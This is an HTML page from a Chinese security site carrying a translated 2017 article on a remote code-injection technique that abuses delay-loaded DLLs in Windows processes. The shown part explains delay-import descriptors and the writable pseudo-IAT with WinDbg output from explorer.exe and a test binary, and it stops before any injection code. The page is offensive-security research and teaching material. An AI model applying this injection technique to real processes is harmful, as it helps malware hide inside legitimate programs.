@@ -1,0 +1,635 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】利用DLL延迟加载实现远程代码注入  - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="DLL,代码注入,远程"/>
+    
+        <meta name="description" content="在本文中，我们将为读者详细介绍一种新型的远程代码注入技术，实际上，这种技术是我在鼓捣延迟加载DLL时发现的。通过该技术，只要这些进程实现了本文所利用的功能：延迟加载DLL，攻击者可以将任意代码注入到正在运行的任何远程进程中。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】利用DLL延迟加载实现远程代码注入 </h2>
+                <div class="article-msg">
+                    <span class="time">2017-09-25 13:54:22</span>
+                    
+                                        <span class="read">阅读：2974次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_4463"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="4463" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="http://hatriot.github.io/blog/2017/09/19/abusing-delay-load-dll/"
+                             target="_blank">来源： hatriot.github.io</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2522399780" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2522399780" style="color:#848e99;">shan66</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><img src="http://p6.qhimg.com/t016cdd1bfcc4f40e9a.jpg" title="t01decb9b5afc0bfba1.jpg" alt="http://p5.qhimg.com/t01decb9b5afc0bfba1.jpg"/></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">译者：</span><a href="http://bobao.360.cn/member/contribute?uid=2522399780" target="_self" style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">shan66</span></a></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">预估稿费：200RMB</span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在本文中，我们将为读者详细介绍一种新型的远程代码注入技术，实际上，这种技术是我在鼓捣延迟加载DLL时发现的。通过该技术，只要这些进程实现了本文所利用的功能：延迟加载DLL，<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 32px;">攻击者可以将任意代码注入到正在运行的任何远程进程中</span>。更准确的说，这并不是一个漏洞利用，而是一种潜入其他进程的策略。&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现代的代码注入技术通常依赖于两个不同的win32 API调用的变体：CreateRemoteThread和NtQueueApc。然而，最近有人发表了一篇非常棒的文章[0]，详细介绍了十种进程注入的方法。当然，这些方法并非都能注入到远程进程中，特别是那些已经在运行的进程，但那篇文章针对最常见的各种注入技术进行了非常细致的讲解，这一点是难能可贵的。而本文介绍的这个策略更像是inline hooking技术，不过我们没有用到IAT，并且也不要求我们的代码已经位于该进程中。我们不需要调用NtQueueApc或CreateRemoteThread，也不需要挂起线程或进程。但是，凡事都会或多或少有一些限制，具体情况将在后文中详细介绍。&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">延迟加载DLL</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">延迟加载是一种链接器策略，即允许延迟加载DLL。可执行文件通常会在运行时加载所有必需的动态链接库，然后执行IAT修复。 然而，延迟加载技术却允许这些库直到调用时才加载，为此，可以在第一次调时使用伪IAT进行修复处理。这个过程用下图来进行完美的阐释：</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p2.qhimg.com/t01a75b3a89d90f9765.png" title="t0111450ce6b3b39dee.png" alt="http://p8.qhimg.com/t0111450ce6b3b39dee.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上图来自1998年Microsoft发布的一篇非常棒的文章[1]，尽管该文所描述的策略已经非常棒了，但是这里我们会设法让它更上一个台阶。&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通常PE文件中都含有一个名为IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT的数据目录，您可以使用dumpbin/imports或windbg进行查看，其结构描述详见delayhlp.cpp中，读者可以在WinSDK中找到它：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">struct&nbsp;InternalImgDelayDescr&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;grAttrs;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;attributes
+&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;szName;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;pointer&nbsp;to&nbsp;dll&nbsp;name
+&nbsp;&nbsp;&nbsp;&nbsp;HMODULE&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;phmod;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;address&nbsp;of&nbsp;module&nbsp;handle
+&nbsp;&nbsp;&nbsp;&nbsp;PImgThunkData&nbsp;&nbsp;&nbsp;pIAT;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;address&nbsp;of&nbsp;the&nbsp;IAT
+&nbsp;&nbsp;&nbsp;&nbsp;PCImgThunkData&nbsp;&nbsp;pINT;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;address&nbsp;of&nbsp;the&nbsp;INT
+&nbsp;&nbsp;&nbsp;&nbsp;PCImgThunkData&nbsp;&nbsp;pBoundIAT;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;address&nbsp;of&nbsp;the&nbsp;optional&nbsp;bound&nbsp;IAT
+&nbsp;&nbsp;&nbsp;&nbsp;PCImgThunkData&nbsp;&nbsp;pUnloadIAT;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;address&nbsp;of&nbsp;optional&nbsp;copy&nbsp;of&nbsp;original&nbsp;IAT
+&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwTimeStamp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;0&nbsp;if&nbsp;not&nbsp;bound,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;O.W.&nbsp;date/time&nbsp;stamp&nbsp;of&nbsp;DLL&nbsp;bound&nbsp;to&nbsp;(Old&nbsp;BIND)
+&nbsp;&nbsp;&nbsp;&nbsp;};</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这个表内存放的是RVA，而不是指针。 我们可以通过解析文件头来找到延迟目录的偏移量：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">0:022&gt;&nbsp;lm&nbsp;m&nbsp;explorer
+start&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;module&nbsp;name
+00690000&nbsp;00969000&nbsp;&nbsp;&nbsp;explorer&nbsp;&nbsp;&nbsp;(pdb&nbsp;symbols)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0:022&gt;&nbsp;!dh&nbsp;00690000&nbsp;-f
+File&nbsp;Type:&nbsp;EXECUTABLE&nbsp;IMAGE
+FILE&nbsp;HEADER&nbsp;VALUES
+[...]&nbsp;
+&nbsp;&nbsp;&nbsp;68A80&nbsp;[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;40]&nbsp;address&nbsp;[size]&nbsp;of&nbsp;Load&nbsp;Configuration&nbsp;Directory
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0]&nbsp;address&nbsp;[size]&nbsp;of&nbsp;Bound&nbsp;Import&nbsp;Directory
+&nbsp;&nbsp;&nbsp;&nbsp;1000&nbsp;[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D98]&nbsp;address&nbsp;[size]&nbsp;of&nbsp;Import&nbsp;Address&nbsp;Table&nbsp;Directory
+&nbsp;&nbsp;&nbsp;AC670&nbsp;[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;140]&nbsp;address&nbsp;[size]&nbsp;of&nbsp;Delay&nbsp;Import&nbsp;Directory
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0]&nbsp;address&nbsp;[size]&nbsp;of&nbsp;COR20&nbsp;Header&nbsp;Directory
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0]&nbsp;address&nbsp;[size]&nbsp;of&nbsp;Reserved&nbsp;Directory</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">第一个entry及其延迟链接的DLL可以在以下内容中看到：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">0:022&gt;&nbsp;dd&nbsp;00690000+ac670&nbsp;l8
+0073c670&nbsp;&nbsp;00000001&nbsp;000ac7b0&nbsp;000b24d8&nbsp;000b1000
+0073c680&nbsp;&nbsp;000ac8cc&nbsp;00000000&nbsp;00000000&nbsp;00000000
+0:022&gt;&nbsp;da&nbsp;00690000+000ac7b0&nbsp;
+0073c7b0&nbsp;&nbsp;&quot;WINMM.dll&quot;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这意味着WINMM是动态地链接到explorer.exe的，由于是延迟加载，所以在导入的函数被调用之前，它是不会被加载到进程中的。一旦加载，帮助函数将通过使用GetProcAddress来定位目标函数并在运行时修复这个表，从而完成IAT的修复工作。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">引用的伪IAT与标准PE IAT是分开的；该IAT专用于延迟加载功能，并通过延迟描述符进行引用。例如，就WINMM.dll来说，WINMM的伪IAT为RVA 000b1000。第二个延迟描述符entry的伪IAT具有单独的RVA，其他依此类推。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面我们使用WINMM来说明延迟加载，资源管理器会从WINMM中导入一个函数，即PlaySoundW。在我实验中，它没有被调用，所以伪IAT还没有修复。 我们可以通过转储的伪IAT条目来查看这一点：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">0:022&gt;&nbsp;dps&nbsp;00690000+000b1000&nbsp;l2
+00741000&nbsp;&nbsp;006dd0ac&nbsp;explorer!_imp_load__PlaySoundW
+00741004&nbsp;&nbsp;00000000</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里，每个DLL条目都是以null结尾的。上面的指针告诉我们，现有的条目只是在Explorer进程中的跳板。这需要我们：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">0:022&gt;&nbsp;u&nbsp;explorer!_imp_load__PlaySoundW
+explorer!_imp_load__PlaySoundW:
+006dd0ac&nbsp;b800107400&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,offset&nbsp;explorer!_imp__PlaySoundW&nbsp;(00741000)
+006dd0b1&nbsp;eb00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;explorer!_tailMerge_WINMM_dll&nbsp;(006dd0b3)
+explorer!_tailMerge_WINMM_dll:
+006dd0b3&nbsp;51&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ecx
+006dd0b4&nbsp;52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edx
+006dd0b5&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;eax
+006dd0b6&nbsp;6870c67300&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;offset&nbsp;explorer!_DELAY_IMPORT_DESCRIPTOR_WINMM_dll&nbsp;(0073c670)
+006dd0bb&nbsp;e8296cfdff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;explorer!__delayLoadHelper2&nbsp;(006b3ce9)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">tailMerge函数是一个链接器生成的存根，它在每个DLL中编译，而不是每个函数。 __delayLoadHelper2函数是处理伪IAT的加载和修补的magic。根据delayhlp.cpp可知，该函数用来处理LoadLibrary/GetProcAddress调用以及修复伪IAT。为了便于演示，我编译了一个延迟链接dnslib的二进制文件。下面是DnsAcquireContextHandle的解析过程：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">0:000&gt;&nbsp;dps&nbsp;00060000+0001839c&nbsp;l2
+0007839c&nbsp;&nbsp;000618bd&nbsp;DelayTest!_imp_load_DnsAcquireContextHandle_W
+000783a0&nbsp;&nbsp;00000000
+0:000&gt;&nbsp;bp&nbsp;DelayTest!__delayLoadHelper2
+0:000&gt;&nbsp;g
+ModLoad:&nbsp;753e0000&nbsp;7542c000&nbsp;&nbsp;&nbsp;C:\Windows\system32\apphelp.dll
+Breakpoint&nbsp;0&nbsp;hit
+[...]
+0:000&gt;&nbsp;dd&nbsp;esp+4&nbsp;l1
+0024f9f4&nbsp;&nbsp;00075ffc
+0:000&gt;&nbsp;dd&nbsp;00075ffc&nbsp;l4
+00075ffc&nbsp;&nbsp;00000001&nbsp;00010fb0&nbsp;000183c8&nbsp;0001839c
+0:000&gt;&nbsp;da&nbsp;00060000+00010fb0&nbsp;
+00070fb0&nbsp;&nbsp;&quot;DNSAPI.dll&quot;
+0:000&gt;&nbsp;pt
+0:000&gt;&nbsp;dps&nbsp;00060000+0001839c&nbsp;l2
+0007839c&nbsp;&nbsp;74dfd0fc&nbsp;DNSAPI!DnsAcquireContextHandle_W
+000783a0&nbsp;&nbsp;00000000</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在伪IAT条目已被修复，这样在后续调用中就能调用正确的函数了。这样，伪IAT就同时具有可执行和可写属性：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">0:011&gt;&nbsp;!vprot&nbsp;00060000+0001839c
+BaseAddress:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00371000
+AllocationBase:&nbsp;&nbsp;&nbsp;&nbsp;00060000
+AllocationProtect:&nbsp;00000080&nbsp;&nbsp;PAGE_EXECUTE_WRITECOPY</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">此时，DLL已经加载到进程中，伪IAT也已修复。当然，并不是所有的函数都能够在加载时进行解析，相反，只有被调用的函数才能这样。 这会让伪IAT中的某些条目处于混合状态：&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">00741044&nbsp;&nbsp;00726afa&nbsp;explorer!_imp_load__UnInitProcessPriv
+00741048&nbsp;&nbsp;7467f845&nbsp;DUI70!InitThread
+0074104c&nbsp;&nbsp;00726b0f&nbsp;explorer!_imp_load__UnInitThread
+00741050&nbsp;&nbsp;74670728&nbsp;DUI70!InitProcessPriv
+0:022&gt;&nbsp;lm&nbsp;m&nbsp;DUI70
+start&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;module&nbsp;name
